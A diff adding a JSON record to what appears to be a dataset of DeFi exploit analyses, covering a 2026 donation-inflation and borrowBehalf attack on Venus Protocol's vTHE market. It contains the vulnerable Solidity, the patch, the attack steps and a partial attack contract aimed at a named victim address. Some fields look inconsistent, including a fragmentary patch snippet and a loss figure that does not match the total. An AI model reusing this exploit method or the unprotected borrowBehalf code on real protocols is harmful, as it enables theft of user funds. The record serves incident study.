@@ -1,0 +1,41 @@
+{
+ "id": "2026__2026-03-15_Venus_THE_BorrowBehalf_Donation_Attack",
+ "source_file": "2026/2026-03-15_Venus_THE_BorrowBehalf_Donation_Attack.md",
+ "title": "Venus Protocol THE — BorrowBehalf + Donation Attack Analysis",
+ "date": "2026-03-15",
+ "protocol": "Venus Protocol",
+ "chain": "BNB Smart Chain",
+ "loss_raw": "~913K CAKE (~$1.31M) + 1.58M USDC + ~1,972 WBNB (~$1.28M) ≈ **$3.7M extracted; $2.15M protocol bad debt**",
+ "loss_usd": 1.31,
+ "root_cause": "Exchange rate inflation via donation + monetizing inflated collateral value via borrowBehalf",
+ "attack_tx": "0x4f47...663f",
+ "vulnerable_contract": "vTHE (0x86e0...739f)",
+ "classes": [
+  "donation-inflation"
+ ],
+ "code_before": [
+  "// Vulnerable code at time of attack (no access control)\nfunction borrowBehalf(address borrower, uint borrowAmount) external returns (uint) {\n    // ❌ Does not check whether borrower has approved the caller\n    // Anyone can borrow on behalf of another user; funds go to msg.sender (caller)\n    return borrowInternal(borrower, payable(msg.sender), borrowAmount);\n}",
+  "function borrowFresh(\n    address borrower,       // The account against which debt is recorded\n    address payable receiver, // The account that receives funds (= msg.sender)\n    uint borrowAmount,\n    bool shouldTransfer\n) internal returns (uint) {\n    uint allowed = comptroller.borrowAllowed(address(this), borrower, borrowAmount);\n    if (allowed != 0) {\n        revert(\"math error\");\n    }\n\n    // ...\n\n    // ❌ Debt is recorded against borrower\n    accountBorrows[borrower].principal = vars.accountBorrowsNew;\n    accountBorrows[borrower].interestIndex = borrowIndex;\n    totalBorrows = vars.totalBorrowsNew;\n\n    // ❌ Funds are delivered to receiver (= attacker)\n    if (shouldTransfer) {\n        doTransferOut(receiver, borrowAmount);\n    }\n\n    emit Borrow(borrower, borrowAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);\n    return uint(Error.NO_ERROR);\n}",
+  "function exchangeRateStoredInternal() internal view virtual returns (MathError, uint) {\n    uint _totalSupply = totalSupply;\n    if (_totalSupply == 0) {\n        return (MathError.NO_ERROR, initialExchangeRateMantissa);\n    } else {\n        // totalCash = underlying token balance held by the contract\n        // ❌ Tokens sent via direct transfer are also included in totalCash\n        uint totalCash = _getCashPriorWithFlashLoan();\n\n        // exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply\n        // ❌ Increasing totalCash raises the exchangeRate\n        // ❌ totalSupply is unchanged, so existing vToken holders' collateral value is inflated\n        (mathErr, cashPlusBorrowsMinusReserves) = addThenSubUInt(\n            totalCash, totalBorrows, totalReserves\n        );\n        (mathErr, exchangeRate) = getExp(cashPlusBorrowsMinusReserves, _totalSupply);\n        return (MathError.NO_ERROR, exchangeRate.mantissa);\n    }\n}"
+ ],
+ "code_after": [
+  "// Patched code (access control added)\nfunction borrowBehalf(address borrower, uint borrowAmount) external returns (uint) {\n    // ✅ Verifies that borrower has approved msg.sender as a delegate\n    require(comptroller.approvedDelegates(borrower, msg.sender), \"not an approved delegate\");\n    return borrowInternal(borrower, payable(msg.sender), borrowAmount);\n}",
+  "✅ Comptroller supply cap validation runs only through the mint() path\n    uint allowed = comptroller.mintAllowed(address(this), minter, mintAmount);\n    if (allowed != 0) {\n        return (failOpaque(...), 0);\n    }\n    // ...\n}\n//"
+ ],
+ "steps": [
+  "1. Received 7,447 ETH via Tornado Cash",
+  "2. Deposited as collateral on Aave and borrowed $9.92M in stablecoins",
+  "3. Distributed across 6 wallets and gradually accumulated THE tokens over ~9 months",
+  "4. 6 EOAs executed THE `type(uint256).max` approvals to the future attack contract address (pre-computed via CREATE2)",
+  "Step 1: THE Donation — Supply Cap Bypass + Exchange Rate Inflation",
+  "Step 2: borrowBehalf — Borrow USDC Under Victim's Name",
+  "Step 3: Recursive Leverage — Further Amplifying Collateral Value",
+  "Step 4: Final Borrow — Multiple Assets Under Victim's Name",
+  "- THE buying pressure evaporates → price crashes from $0.51 to $0.22",
+  "- Illiquid THE collateral cannot be converted at sufficient value → **$2.15M bad debt** incurred"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────────┐\n│ Step 1: THE Donation — Supply Cap Bypass + Exchange Rate Inflation│\n├─────────────────────────────────────────────────────────────────┤\n│                                                                 │\n│  EOA 0 ──transferFrom──▶ vTHE  (+13.2M THE)                    │\n│  EOA 1 ──transferFrom──▶ vTHE  (+ 9.5M THE)                    │\n│  EOA 2 ──transferFrom──▶ vTHE  (+ 7.5M THE)                    │\n│  EOA 3 ──transferFrom──▶ vTHE  (+ 3.9M THE)                    │\n│  Victim ─transferFrom──▶ vTHE  (+ 0.7M THE)                    │\n│  EOA 5 ──transferFrom──▶ vTHE  (+ 1.3M THE)                    │\n│                           ────────────────                      │\n│                           Total ~36M THE directly tran",
+  "contract VenusVtheBorrowBehalfRuntime {\n    address internal constant VICTIM = 0x1A35bD28EFD46CfC46c2136f878777D69ae16231;\n\n    function attack() external {\n        // Step 1: Directly transfer pre-approved THE from 6 EOAs to vTHE (donation)\n        _donateVictimApprovedTHE();\n\n        // Step 2: Borrow USDC under victim's name; funds received by attacker (this)\n        require(VUSDC.borrowBehalf(VICTIM, USDC_BORROW_AMOUNT) == 0);\n\n        // Step 3: Mint vUSDC with borrowed USDC → obtain collateral\n        require(USDC.approve(address(VUSDC), USDC_BORROW_AMOUNT));\n        require(VUSDC.mint(USDC_BORROW_AMOUNT) == 0);\n\n        // Enter collateral market\n        address[] memory markets = new address[](1);\n        markets[0] = address(VUSDC);\n        COMPTROLLER.enterMarkets(markets);\n\n    "
+ ]
+}
